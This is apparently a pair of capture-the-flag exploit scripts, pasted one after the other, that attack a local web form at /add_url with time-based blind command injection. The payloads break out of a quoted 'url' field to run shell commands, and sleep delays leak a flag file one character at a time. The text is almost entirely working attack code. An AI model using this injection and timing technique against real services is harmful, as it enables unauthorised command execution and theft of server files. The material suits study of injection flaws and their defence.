import requests
import time

TARGET_URL = "http://127.0.0.1:32998/add_url"

def send_payload(payload_cmd, timeout=10):
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start = time.time()
    try:
        r = requests.post(TARGET_URL, data=data, timeout=timeout)
        return time.time() - start, r.status_code
    except:
        return 10, None

# Test simpler approach - check if file has content
print("[*] Testing file content approach")

# First, check if file exists and get first character
# Try using sed to extract character
test_cmds = [
    'test "$(cat /tmp/flag.b64 | head -c1)" = "Z" && sleep 3',
    'test "$(cat /tmp/flag.b64 | sed -n 1,1p | cut -c1)" = "Z" && sleep 3',
    'case "$(cat /tmp/flag.b64 | head -c1)" in Z*) sleep 3;; esac',
]

for i, cmd in enumerate(test_cmds):
    print(f"\n[*] Test {i+1}: {cmd}")
    elapsed, status = send_payload(cmd)
    print(f"    Time: {elapsed:.3f}s, Status: {status}")

# Try uppercase letter check first (flags usually start with uppercase)
charset_upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

print("\n[*] Testing charset on position 1:")
for c in 'FSZACT':
    cmd = f'test "$(cat /tmp/flag.b64 | head -c1)" = "{c}" && sleep 3'
    elapsed, _ = send_payload(cmd, timeout=5)
    print(f"    Char '{c}': {elapsed:.3f}s")

import requests
import time

TARGET_URL = "http://127.0.0.1:32998/add_url"

def send_payload(payload_cmd, timeout=10):
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start = time.time()
    try:
        r = requests.post(TARGET_URL, data=data, timeout=timeout)
        return time.time() - start, r.status_code
    except:
        return 10, None

# Maybe the file is empty or there was an error in encoding
print("[*] Checking if flag file was encoded properly")

# First check file size with stat
print("\n[*] Testing stat command:")
payload = "stat /tmp/flag.b64 2>&1 | grep -q 'regular file' && sleep 2"
elapsed, _ = send_payload(payload, timeout=5)
print(f"    Is regular file: {elapsed:.3f}s")

# Check file is readable and not empty
print("\n[*] Checking if file is non-empty:")
payload = "test -s /tmp/flag.b64 && sleep 2"
elapsed, _ = send_payload(payload, timeout=5)
print(f"    Non-empty file: {elapsed:.3f}s")

# Try read file with dd
print("\n[*] Testing dd command extraction:")
for i in range(1, 10):
    cmd = f'dd if=/tmp/flag.b64 bs=1 count=1 skip={i-1} 2>/dev/null'
    # Try checking if result equals different chars
    test_chars = ['F', 'l', 'a', 'g']
    for c in test_chars:
        full_cmd = f'[[ $({cmd}) == "{c}" ]] && sleep 2'
        elapsed, _ = send_payload(full_cmd, timeout=5)
        if elapsed > 1.5:
            print(f"    Position {i}: Char '{c}' (elapsed: {elapsed:.3f}s)")
            break

